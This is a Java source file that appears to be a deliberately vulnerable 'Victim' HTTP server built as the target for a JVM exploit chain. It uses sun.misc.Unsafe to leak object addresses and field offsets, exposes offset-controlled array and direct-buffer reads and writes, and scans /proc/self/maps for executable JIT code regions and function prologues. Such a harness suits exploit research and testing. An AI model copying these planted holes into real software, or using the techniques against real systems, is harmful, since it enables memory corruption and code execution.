import com.sun.net.httpserver.HttpServer;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.Executors;
import sun.misc.Unsafe;

public final class Victim {
    static Unsafe U;
    static volatile long sink;
    static volatile byte[] dec, writer, reader;
    static volatile ByteBuffer dbuf;
    static volatile Object[] holder;
    static final int TIGHT = 98;
    static long addrOff, capOff, limOff;

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);
        addrOff = U.objectFieldOffset(java.nio.Buffer.class.getDeclaredField("address"));
        capOff  = U.objectFieldOffset(java.nio.Buffer.class.getDeclaredField("capacity"));
        limOff  = U.objectFieldOffset(java.nio.Buffer.class.getDeclaredField("limit"));

        byte[] valid = "A".repeat(128).getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += Base64.getDecoder().decode(valid, warm);
        for (int i = 0; i < 200_000; i++) sink += probe(i);
        byte[] wd = new byte[64], pd = new byte[64];
        for (int i = 0; i < 200_000; i++) { poke(wd, i & 63, (byte) i); pull(wd, i & 31, pd, 32); }
        ByteBuffer d0 = ByteBuffer.allocateDirect(64);
        for (int i = 0; i < 200_000; i++) dbputOn(d0, i & 63, (byte) i);

        HttpServer s = HttpServer.create(new InetSocketAddress(8080), 0);
        s.setExecutor(Executors.newFixedThreadPool(1));

        s.createContext("/alloc", ex -> {
            dec = new byte[TIGHT];
            writer = new byte[64];
            reader = new byte[64];
            dbuf = ByteBuffer.allocateDirect(64);
            holder = new Object[]{dec, writer, reader, dbuf};
            long b = U.ARRAY_BYTE_BASE_OFFSET;
            int o1 = U.getInt(holder, b), o2 = U.getInt(holder, b + 4), o3 = U.getInt(holder, b + 8), o4 = U.getInt(holder, b + 12);
            reply(ex, String.format("d1=%d d2=%d dbufDelta=%d base=%d addrOff=%d capOff=%d limOff=%d%n",
                    o2 - o1, o3 - o2, o4 - o2, (o4 - o2) - 16, addrOff, capOff, limOff));
        });

        s.createContext("/decode", ex -> {
            String q = ex.getRequestURI().getQuery();
            String b64 = q.substring(q.indexOf("b64=") + 4);
            String out;
            try { sink += Base64.getDecoder().decode(b64.getBytes(StandardCharsets.US_ASCII), dec); out = "ok"; }
            catch (IllegalArgumentException e) { out = "rejected"; }
            reply(ex, out + " writer.len=" + writer.length + " reader.len=" + reader.length + "\n");
        });

        s.createContext("/write", ex -> {
            String q = ex.getRequestURI().getQuery();
            poke(writer, Integer.parseInt(q.replaceAll(".*off=(-?\\d+).*", "$1")),
                        (byte) Integer.parseInt(q.replaceAll(".*val=(-?\\d+).*", "$1")));
            reply(ex, "ok\n");
        });

        s.createContext("/read", ex -> {
            String q = ex.getRequestURI().getQuery();
            int off = Integer.parseInt(q.replaceAll(".*off=(-?\\d+).*", "$1"));
            int n = Integer.parseInt(q.replaceAll(".*n=(\\d+).*", "$1"));
            byte[] buf = new byte[n];
            pull(reader, off, buf, n);
            reply(ex, Base64.getEncoder().encodeToString(buf) + "\n");
        });

        s.createContext("/dbput", ex -> {
            String q = ex.getRequestURI().getQuery();
            dbput(Integer.parseInt(q.replaceAll(".*off=(-?\\d+).*", "$1")),
                  (byte) Integer.parseInt(q.replaceAll(".*val=(-?\\d+).*", "$1")));
            reply(ex, "ok\n");
        });

        s.createContext("/scan", ex -> {
            byte[] pat = {(byte) 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11};
            StringBuilder sb = new StringBuilder();
            int ri = 0;
            for (String l : java.nio.file.Files.readAllLines(java.nio.file.Path.of("/proc/self/maps"))) {
                if (!l.contains("rwx")) continue;
                ri++;
                String[] pp = l.split("\\s+")[0].split("-");
                long rs = Long.parseUnsignedLong(pp[0], 16), re2 = Long.parseUnsignedLong(pp[1], 16);
                long hit = -1;
                outer:
                for (long q2 = rs; q2 < re2 - 8; q2++) {
                    if (U.getByte(q2) != pat[0]) continue;
                    for (int i = 1; i < 8; i++) if (U.getByte(q2 + i) != pat[i]) continue outer;
                    hit = q2; break;
                }
                if (hit < 0) { sb.append("region ").append(ri).append(" nohit end=").append(Long.toHexString(re2)).append("\n"); continue; }
                long site = -1;
                for (long q2 = hit - 1; q2 > hit - 80 && q2 > rs; q2--) {
                    int b2 = U.getByte(q2) & 0xff;
                    if (b2 == 0x55 && (U.getByte(q2 + 1) & 0xff) == 0x48 && (U.getByte(q2 + 2) & 0xff) == 0x83 && (U.getByte(q2 + 3) & 0xff) == 0xec) { site = q2; break; }
                    if (b2 == 0x48 && (U.getByte(q2 + 1) & 0xff) == 0x81 && (U.getByte(q2 + 2) & 0xff) == 0xec) { site = q2; break; }
                }
                sb.append("region ").append(ri).append(" hit=").append(Long.toHexString(hit))
                  .append(" site=").append(site < 0 ? "none" : Long.toHexString(site))
                  .append(" end=").append(Long.toHexString(re2)).append("\n");
            }
            reply(ex, sb.toString());
        });

        s.createContext("/trigger", ex -> { sink += probe(1); reply(ex, "triggered\n"); });

        s.createContext("/state", ex -> reply(ex,
                "dec=" + (dec == null ? -1 : dec.length)
                + " writer=" + (writer == null ? -1 : writer.length)
                + " reader=" + (reader == null ? -1 : reader.length) + "\n"));

        s.start();
        System.out.println("victim up");
    }

    static void reply(com.sun.net.httpserver.HttpExchange ex, String body) throws java.io.IOException {
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        ex.sendResponseHeaders(200, b.length);
        try (OutputStream o = ex.getResponseBody()) { o.write(b); }
    }

    static void poke(byte[] a, int i, byte v) { a[i] = v; }
    static void dbput(int off, byte v) { dbuf.put(off, v); }
    static void dbputOn(ByteBuffer b, int off, byte v) { b.put(off, v); }

    static void pull(byte[] src, int from, byte[] dst, int n) {
        for (int i = 0; i < n; i++) dst[i] = src[from + i];
    }

    static long probe(long x) { return x ^ 0x1122334455667788L; }
}
